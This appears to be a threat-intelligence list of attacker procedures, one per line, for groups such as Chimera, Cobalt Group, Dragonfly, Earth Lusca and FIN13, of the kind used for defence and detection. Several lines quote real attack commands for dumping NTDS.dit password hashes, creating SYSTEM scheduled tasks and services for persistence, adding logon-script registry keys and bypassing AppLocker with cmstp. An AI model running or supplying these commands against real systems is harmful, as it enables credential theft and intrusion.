Chimera has gathered the SYSTEM registry and ntds.dit files from target systems. Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via &lt;code&gt;msadcs.exe "NTDS.dit" -s "SYSTEM" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv&lt;/code&gt; and used ntdsutil to copy the Active Directory database.
Chimera has used direct Windows system calls by leveraging Dumpert.
Chimera has used the &lt;code&gt;get -b &lt;start ip&gt; -e &lt;end ip&gt; -p&lt;/code&gt; command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.
Chimera has used &lt;code&gt;net share&lt;/code&gt; and &lt;code&gt;net view&lt;/code&gt; to identify network shares of interest.
Chimera has dumped password hashes for use in pass the hash authentication attacks.
Chimera has used the NtdsAudit utility to collect information related to accounts and passwords.
Chimera has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.
Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.
Chimera has used &lt;code&gt;tasklist&lt;/code&gt; to enumerate processes.
Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.
Chimera has queried Registry keys using &lt;code&gt;reg query \\&lt;host&gt;\HKU\&lt;SID&gt;\SOFTWARE\Microsoft\Terminal Server Client\Servers&lt;/code&gt; and &lt;code&gt;reg query \\&lt;host&gt;\HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Internet Settings&lt;/code&gt;.
Chimera has staged stolen data on designated servers in the target environment.
Chimera has used RDP to access targeted systems.
Chimera has harvested data from remote mailboxes including through execution of &lt;code&gt;\\&lt;hostname&gt;\c$\Users\&lt;username&gt;\AppData\Local\Microsoft\Outlook*.ost&lt;/code&gt;.
Chimera has utilized various scans and queries to find domain controllers and remote services in the target environment.
Chimera has used Windows admin shares to move laterally.
Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script &lt;code&gt;schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st&lt;/code&gt; and to maintain persistence.
Chimera has used PsExec to deploy beacons on compromised systems.
Chimera has collected documents from the victim's SharePoint.
Chimera has used `fsutil fsinfo drives`, `systeminfo`, and `vssadmin list shadows` for system information including shadow volumes and drive information.
Chimera has used ipconfig, Ping, and &lt;code&gt;tracert&lt;/code&gt; to enumerate the IP address and network environment and settings of the local host.
Chimera has used &lt;code&gt;netstat -ano | findstr EST&lt;/code&gt; to discover network connections.
Chimera has used the &lt;code&gt;quser&lt;/code&gt; command to show currently logged on users.
Chimera has used &lt;code&gt;net start&lt;/code&gt; and &lt;code&gt;net use&lt;/code&gt; for system service discovery.
Chimera has used &lt;code&gt;time /t&lt;/code&gt; and &lt;code&gt;net time \\ip/hostname&lt;/code&gt; for system time discovery.
Chimera has used a Windows version of the Linux &lt;code&gt;touch&lt;/code&gt; command to modify the date and time stamp on DLLs.
Chimera has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec.
Chimera has used a valid account to maintain persistence via scheduled task.
Chimera has used HTTPS for C2 communications.
Chimera has used the Windows Command Shell and batch scripts for execution on compromised hosts.
Chimera has used WMIC to execute remote commands.
Chimera has used WinRM for lateral movement.
Cinnamon Tempest has used search order hijacking to launch Cobalt Strike Beacons.
Cinnamon Tempest has abused legitimate executables to side-load weaponized DLLs.
Cinnamon Tempest has used weaponized DLLs to load and decrypt payloads.
Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware.
Cinnamon Tempest has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.
Cinnamon Tempest has exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange, Manage Engine AdSelfService Plus, Confluence, and Log4j.
Cinnamon Tempest has maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom.
Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment.
Cinnamon Tempest has downloaded files, including Cobalt Strike, to compromised hosts.
Cinnamon Tempest has used PowerShell to communicate with C2, download files, and execute reconnaissance commands.
Cinnamon Tempest has used the Iox and NPS proxy and tunneling tools in combination  create multiple connections through a single tunnel.
Cinnamon Tempest has used a customized version of the Iox port-forwarding and proxy tool.
Cinnamon Tempest has used a customized version of the Impacket wmiexec.py module to create renamed output files.
Cinnamon Tempest has used SMBexec for lateral movement.
Cinnamon Tempest has deployed ransomware from a batch file in a network share.
Cinnamon Tempest has used open-source tools including customized versions of the Iox proxy tool, NPS tunneling tool, Meterpreter, and a keylogger that uploads data to Alibaba cloud storage.
Cinnamon Tempest has used compromised user accounts to deploy payloads and create system services.
Cinnamon Tempest has executed ransomware using batch scripts deployed via GPO.
Cinnamon Tempest has used Impacket for lateral movement via WMI.
Cinnamon Tempest has created system services to establish persistence for deployed tooling.
Cleaver has used custom tools to facilitate ARP cache poisoning.
Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor.
Cleaver has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.
Cleaver has created fake LinkedIn profiles that included profile photos, details, and connections.
Cleaver has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz.
Cobalt Group has used the Plink utility to create SSH tunnels.
Cobalt Group has bypassed UAC.
Cobalt Group has used the command &lt;code&gt;cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt&lt;/code&gt; to bypass AppLocker and launch a malicious script.
Cobalt Group obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR and RC4.
Cobalt Group has compromised legitimate web browser updates to deliver a backdoor.
Cobalt Group has used DNS tunneling for C2.
Cobalt Group has sent malicious Word OLE compound documents to victims.
Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.
Cobalt Group has used exploits to increase their levels of rights and privileges.
Cobalt Group deleted the DLL dropper from the victim’s machine to cover their tracks.
Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files.
Cobalt Group has executed JavaScript scriptlets on the victim's machine.
Cobalt Group has added persistence by registering the file name for the next stage malware under &lt;code&gt;HKCU\Environment\UserInitMprLogonScript&lt;/code&gt;.
Cobalt Group has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.
Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.
Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.
Cobalt Group has used &lt;code&gt;odbcconf&lt;/code&gt; to proxy the execution of malicious DLL files.
Cobalt Group has used powershell.exe to download and execute scripts.
Cobalt Group has injected code into trusted processes.
Cobalt Group has used the Plink utility to create SSH tunnels.
Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.
Cobalt Group has used regsvr32.exe to execute scripts.
Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.
Cobalt Group has used Remote Desktop Protocol to conduct lateral movement.
Cobalt Group has created Windows tasks to establish persistence.
Cobalt Group used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.
Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.
Cobalt Group has sent emails with URLs pointing to malicious documents.
Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete.
Cobalt Group has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.
Cobalt Group has used HTTPS for C2.
Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files.
Cobalt Group has created new services to establish persistence.
Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.
Confucius has used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg.
Confucius has exfiltrated stolen files to its C2 server.
Confucius has exfiltrated victim data to cloud storage service accounts.
Confucius has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.
Confucius has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions.
Confucius has downloaded additional files and payloads onto a compromised host following initial access.
Confucius has lured victims to execute malicious attachments included in crafted spearphishing emails related to current topics.
Confucius has lured victims into clicking on a malicious link sent through spearphishing.
Confucius has used mshta.exe to execute malicious VBScript.
Confucius has used PowerShell to execute malicious files and payloads.
Confucius has dropped malicious files into the startup folder `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup` on a compromised host in order to maintain persistence.
Confucius has created scheduled tasks to maintain persistence on a compromised host.
Confucius has crafted and sent victims malicious attachments to gain initial access.
Confucius has sent malicious links to victims through email campaigns.
Confucius has used a file stealer that can examine system drives, including those other than the C drive.
Confucius has used a weaponized Microsoft Word document with an embedded RTF exploit.
Confucius has used VBScript to execute malicious code.
Confucius has used HTTP for C2 communications.
Confucius has obtained cloud storage service accounts to host stolen data.
CopyKittens encrypts data with a substitute cipher prior to exfiltration.
CopyKittens uses ZPP, a .NET console program, to compress files with ZIP.
CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.
CopyKittens has used &lt;code&gt;-w hidden&lt;/code&gt; and &lt;code&gt;-windowstyle hidden&lt;/code&gt; to conceal PowerShell windows.
CopyKittens has used PowerShell Empire.
CopyKittens has used the AirVPN service for operational activity.
CopyKittens uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.
CopyKittens has used Metasploit, Empire, and AirVPN for post-exploitation activities.
Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable.
Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems.
Dark Caracal leveraged a watering hole to serve up malicious code.
Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them.
Dark Caracal collected file listings of all default Windows directories.
Dark Caracal makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.
Dark Caracal's version of Bandook adds a registry key to &lt;code&gt;HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; for persistence.
Dark Caracal took screenshots using their Windows malware.
Dark Caracal has used UPX to pack Bandook.
Dark Caracal spearphished victims via Facebook and Whatsapp.
Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&amp;&amp;&amp;”.
Dark Caracal has used macros in Word documents that would download a second stage if executed.
DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.
DarkHydrus has used &lt;code&gt;-WindowStyle Hidden&lt;/code&gt; to conceal PowerShell windows.
DarkHydrus has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.
DarkHydrus leveraged PowerShell to download and execute additional scripts for execution.
DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.
DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.
DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike.
DarkVishnya used brute-force attack to obtain login data.
DarkVishnya used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company’s local network.
DarkVishnya performed port scanning to obtain the list of active services.
DarkVishnya scanned the network for public shared folders.
DarkVishnya used network sniffing to obtain login data.
DarkVishnya used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.
DarkVishnya used PowerShell to create shellcode loaders.
DarkVishnya used DameWare Mini Remote Control for lateral movement.
DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec.
DarkVishnya created new services for shellcode loaders distribution.
Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen. Darkhotel has also stolen certificates and signed backdoors and downloaders with them.
Darkhotel has decrypted strings and imports using RC4 during execution.
Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware.
Darkhotel has obfuscated code using RC4, XOR, and RSA.
Darkhotel has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.
Darkhotel has used malware that searched for files with specific patterns.
Darkhotel has used first-stage payloads that download additional malware from C2 servers.
Darkhotel has used a keylogger.
Darkhotel has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.
Darkhotel has used malware that is disguised as a Secure Shell (SSH) tool.
Darkhotel malware can collect a list of running processes on a system.
Darkhotel has been known to establish persistence by adding programs to the Run Registry key.
Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.
Darkhotel has searched for anti-malware strings and anti-virus processes running on the system.
Darkhotel has sent spearphishing emails with malicious RAR and .LNK attachments.
Darkhotel has used AES-256 and 3DES for C2 communications.
Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with &lt;code&gt;.Md5.exe&lt;/code&gt;, and if the program is executed from the root of the C:\ drive, as well as checks for sandbox-related libraries.
Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine.
Darkhotel has collected the IP address and network adapter information from the victim’s machine.
Darkhotel malware can obtain system time from a compromised host.
Darkhotel used a virus that propagates by infecting executables stored on shared drives.
Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.
Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection.
Darkhotel has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.
Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.
Deep Panda has used &lt;code&gt;-w hidden&lt;/code&gt; to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
Deep Panda has updated and modified its malware, resulting in different hash values that evade detection.
Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk.
Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.
Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.
Deep Panda has used ping to identify other machines of interest.
Deep Panda uses net.exe to connect to network shares using &lt;code&gt;net use&lt;/code&gt; commands with compromised credentials.
Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.
The Deep Panda group is known to utilize WMI for lateral movement.
Dragonfly has added newly created accounts to the administrators group to maintain elevated access.
Dragonfly has compressed data into .zip files prior to exfiltration.
Dragonfly has attempted to brute force credentials to gain access.
Dragonfly has collected open source information to identify relationships between organizations for targeting purposes.
Dragonfly has cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.
Dragonfly has used the command line for execution.
Dragonfly has placed trojanized installers for control system software on legitimate vendor app stores.
Dragonfly has collected data from local victim systems.
Dragonfly has disabled host-based firewalls. The group has also globally opened port 3389.
Dragonfly has used batch scripts to enumerate users on a victim domain controller.
Dragonfly has used batch scripts to enumerate administrators and users in the domain.
Dragonfly has registered domains for targeting intended victims.
Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.
Dragonfly has compromised websites to redirect traffic and to host exploit kits.
Dragonfly has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.
Dragonfly has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.
Dragonfly has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.
Dragonfly has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.
Dragonfly has deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.
Dragonfly has used SMB for C2.
Dragonfly has used a batch script to gather folder and file names from victim hosts.
Dragonfly has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.
Dragonfly has modified the Registry to hide created user accounts.
Dragonfly has copied and installed tools for operations once in the victim environment.
Dragonfly has dropped and executed SecretsDump to dump password hashes.
Dragonfly has created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.
Dragonfly has created a directory named "out" in the user's %AppData% folder and copied files to it.
Dragonfly has used various forms of spearphishing in attempts to get users to open malicious attachments.
Dragonfly has created accounts disguised as legitimate backup and service accounts as well as an email administration account.
Dragonfly has modified the Registry to perform multiple techniques through the use of Reg.
Dragonfly has dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers.
Dragonfly has identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.
Dragonfly has dropped and executed tools used for password cracking, including Hydra and CrackMapExec.
Dragonfly has used PowerShell scripts for execution.
Dragonfly has used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.
Dragonfly has queried the Registry to identify victim information.
Dragonfly has added the registry value ntdll to the Registry Run key to establish persistence.
Dragonfly has moved laterally via RDP.
Dragonfly has accessed email accounts using Outlook Web Access.
Dragonfly has likely obtained a list of hosts in the victim environment.
Dragonfly has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.
Dragonfly has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).
Dragonfly has dropped and executed SecretsDump to dump password hashes.
Dragonfly has compromised legitimate websites to host C2 and malware modules.
Dragonfly has sent emails with malicious attachments to gain initial access.
Dragonfly has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials.
Dragonfly has used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.
Dragonfly has used batch scripts to enumerate network information, including information about trusts, zones, and the domain.
Dragonfly used the command &lt;code&gt;query user&lt;/code&gt; on victim hosts.
Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.
Dragonfly has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec.
Dragonfly has compromised user credentials and used valid accounts for operations.
Dragonfly has acquired VPS infrastructure for use in malicious campaigns.
Dragonfly has scanned targeted systems for vulnerable Citrix and Microsoft Exchange services.
Dragonfly has commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.
Dragonfly has used various types of scripting to perform operations, including batch scripts.
EXOTIC LILY has registered domains to spoof targeted organizations by changing the top-level domain (TLD) to “.us”, “.co” or “.biz”.
EXOTIC LILY has created e-mail accounts to spoof targeted organizations.
EXOTIC LILY has gathered targeted individuals' e-mail addresses through open source research and website contact forms.
EXOTIC LILY has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.
EXOTIC LILY has gained execution through victims clicking on malicious LNK files contained within ISO files, which can execute hidden DLLs within the ISO.
EXOTIC LILY has used malicious links to lure users into executing malicious payloads.
EXOTIC LILY has searched for information on targeted individuals on business databases including RocketReach and CrunchBase.
EXOTIC LILY has used contact forms on victim websites to generate phishing e-mails.
EXOTIC LILY has copied data from social media sites to impersonate targeted individuals.
EXOTIC LILY has established social media profiles to mimic employees of targeted companies.
EXOTIC LILY conducted an e-mail thread-hijacking campaign with malicious ISO attachments.
EXOTIC LILY has relied on victims to open malicious links in e-mails for execution.
EXOTIC LILY has used the e-mail notification features of legitimate file sharing services for spearphishing.
EXOTIC LILY  has uploaded malicious payloads to file-sharing services including TransferNow, TransferXL, WeTransfer, and OneDrive.
EXOTIC LILY has used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads.
Earth Lusca has used WinRAR to compress stolen files into an archive prior to exfiltration.
Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges.
Earth Lusca has used a &lt;code&gt;DCSync&lt;/code&gt; command with Mimikatz to retrieve credentials from an exploited controller.
Earth Lusca has placed a malicious payload in `%WINDIR%\SYSTEM32\oci.dll` so it would be sideloaded by the MSDTC service.
Earth Lusca has used certutil to decode a string into a cabinet file.
Earth Lusca has used Nltest to obtain information about domain controllers.
Earth Lusca has registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks.
Earth Lusca has performed watering hole attacks.
Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA.
Earth Lusca has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish.
Earth Lusca has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).
Earth Lusca has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations.
Earth Lusca has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process.
Earth Lusca required users to click on a malicious file for the loader to activate.
Earth Lusca  has sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader.
Earth Lusca has acquired and used a variety of malware, including Cobalt Strike.
Earth Lusca used the command `move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll` to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.
Earth Lusca modified the registry using the command &lt;code&gt;reg add “HKEY_CURRENT_USER\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]”&lt;/code&gt; for persistence.
Earth Lusca has used `mshta.exe` to load an HTA script within a malicious .LNK file.
Earth Lusca used Base64 to encode strings.
Earth Lusca has used PowerShell to execute commands.
Earth Lusca has added the Registry key `HKLM\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\UDPrint” /v Driver /d “spool.dll /f` to load malware as a Print Processor.
Earth Lusca has used Tasklist to obtain information from a compromised host.
Earth Lusca adopted Cloudflare as a proxy for compromised servers.
Earth Lusca used Python scripts for port scanning or building reverse shells.
Earth Lusca used the command &lt;code&gt;powershell “Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -
property * | findstr “Address””&lt;/code&gt; to find the network information of successfully logged-in accounts to discovery addresses of other machines. Earth Lusca has also used multiple scanning tools to discover other machines within the same compromised network.
Earth Lusca has dropped an SSH-authorized key in the `/root/.ssh` folder in order to access a compromised server with SSH.
Earth Lusca used the command &lt;code&gt;schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system&lt;/code&gt; for persistence.
Earth Lusca has acquired multiple servers for some of their operations, using each server for a different role.
Earth Lusca has used compromised web servers as part of their operational infrastructure.
Earth Lusca has sent spearphishing emails to potential targets that contained a malicious link.
Earth Lusca has used steganography to hide shellcode in a BMP image file.
Earth Lusca used the command &lt;code&gt;ipconfig&lt;/code&gt; to obtain information about network configurations.
Earth Lusca employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log “Microsoft-Windows-TerminalServices-RDPClient/Operational”
(Event ID 1024) to obtain network information from RDP connections. Earth Lusca has also used netstat from a compromised system to obtain network connection information.
Earth Lusca collected information on user accounts via the &lt;code&gt;whoami&lt;/code&gt; command.
Earth Lusca has used Tasklist to obtain information from a compromised host.
Earth Lusca has acquired and used a variety of open source tools.
Earth Lusca has staged malware and malicious files on compromised web servers, GitHub, and Google Drive.
Earth Lusca used VBA scripts.
Earth Lusca has scanned for vulnerabilities in the public-facing servers of their targets.
Earth Lusca has established GitHub accounts to host their malware.
Earth Lusca has compromised Google Drive repositories.
Earth Lusca used a VBA script to execute WMI.
Earth Lusca created a service using the command &lt;code&gt;sc create “SysUpdate” binpath= “cmd /c start “[file path]””&amp;&amp;sc config “SysUpdate” start= auto&amp;&amp;net
start SysUpdate&lt;/code&gt; for persistence.
Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.
Elderwood has encrypted documents and malicious executables.
Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.
The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location.
Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.
Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open links.
Elderwood has packed malware payloads before delivery to victims.
Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.
Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.
Ember Bear has added extra spaces between JavaScript code characters to increase the overall file size.
Ember Bear has used stolen certificates from Electrum Technologies GmbH to sign payloads.
Ember Bear has stolen legitimate certificates to sign malicious payloads.
Ember Bear has obfuscated malicious scripts to help avoid detection.
Ember Bear has used control panel files (CPL), delivered via e-mail, for execution.
Ember Bear has executed a batch script designed to disable Windows Defender on a compromised host.
Ember Bear has exploited Microsoft Office vulnerability CVE-2017-11882.
Ember Bear has used tools to download malicious code.
Ember Bear has used JavaScript to execute malicious code on a victim's machine.
Ember Bear has attempted to lure victims into executing malicious files.
Ember Bear has attempted to lure users to click on a malicious link within a spearphishing email.
Ember Bear has used an open source batch script to modify Windows Defender registry keys.
Ember Bear has obfuscated malware to help avoid detection.
Ember Bear has used PowerShell to download and execute malicious code.
Ember Bear has packed malware to help avoid detection.
Ember Bear has sent spearphishing emails containing malicious attachments in the form of PDFs, Word documents, JavaScript files, and Control Panel File (CPL) executables.
Ember Bear has sent spearphishing emails containing malicious links.
Ember Bear has obtained and used open source scripts from GitHub.
Ember Bear has used Discord's content delivery network (CDN) to deliver malware and malicious scripts to a compromised host.
Ember Bear had used `cmd.exe` and Windows Script Host (wscript) to execute malicious code.
Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers.
Equation has been observed utilizing environmental keying in payload delivery.
Equation has used an encrypted virtual file system stored in the Windows Registry.
Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.
Evilnum has used PowerShell to bypass UAC.
Evilnum can collect email credentials from victims.
Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder.
Evilnum has deleted files used during infection.
Evilnum can deploy additional components or tools as needed.
Evilnum has used malicious JavaScript files on the victim's machine.
Evilnum has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.
EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines.
Evilnum has sent spearphishing emails containing a link to a zip file hosted on Google Drive.
Evilnum can steal cookies and session information from browsers.
Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments.
FIN10 has used batch scripts and scheduled tasks to delete critical system files.
FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.
FIN10 has moved laterally using the Local Administrator account.
FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence.
FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key.
FIN10 has used RDP to move laterally to systems in the victim environment.
FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.
FIN10 has used Meterpreter to enumerate users on remote systems.
FIN10 has relied on publicly-available software to gain footholds and establish persistence in victim environments.
FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.
FIN10 has executed malicious .bat files containing PowerShell commands.
FIN13 has enumerated all users and their roles from a victim's main treasury system.
FIN13 has assigned newly created accounts the sysadmin role to maintain persistence.
FIN13 has compressed the dump output of compromised credentials with a 7zip binary.
FIN13 has obtained administrative credentials by browsing through local files on a compromised machine.
FIN13 has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).
FIN13 has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money.
FIN13 has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration.
FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access.
FIN13 has utilized `certutil` to decode base64 encoded versions of custom malware.
FIN13 can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: `GetUserSPNs.vbs` and `querySpn.vbs`.
FIN13 has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access.
FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).
FIN13 has used the Windows `dir` command to enumerate files and directories in a victim's network.
FIN13 has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions.
FIN13 has researched employees to target for social engineering attacks.
FIN13 has created hidden files and folders within a compromised Linux system `/tmp` directory. FIN13 also has used `attrib.exe` to hide gathered local host information.
FIN13 has downloaded additional tools and malware to compromised systems.
FIN13 has utilized a proxy tool to communicate between compromised assets.
FIN13 has used `Ping` and `tracert` for network reconnaissance efforts.
FIN13 has logged the keystrokes of victims to escalate privileges.
FIN13 has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with Mimikatz.
FIN13 has created MS-SQL local accounts in a compromised network.
FIN13 has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: `C:\Windows\Temp` and `/tmp`.
FIN13 has utilized tools such as Incognito V2 for token manipulation and impersonation.
FIN13 has utilized custom malware to maintain persistence in a compromised environment.
FIN13 has used scheduled tasks names such as `acrotyr` and `AppServicesr` to mimic the same names in a compromised network's `C:\Windows` directory.
FIN13 has masqueraded staged data by using the Windows certutil utility to generate fake Base64 encoded certificates with the input file.
FIN13 has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war.
FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.
FIN13 has harvested the NTDS.DIT file and leveraged the Impacket tool on the compromised domain controller to locally decrypt it.
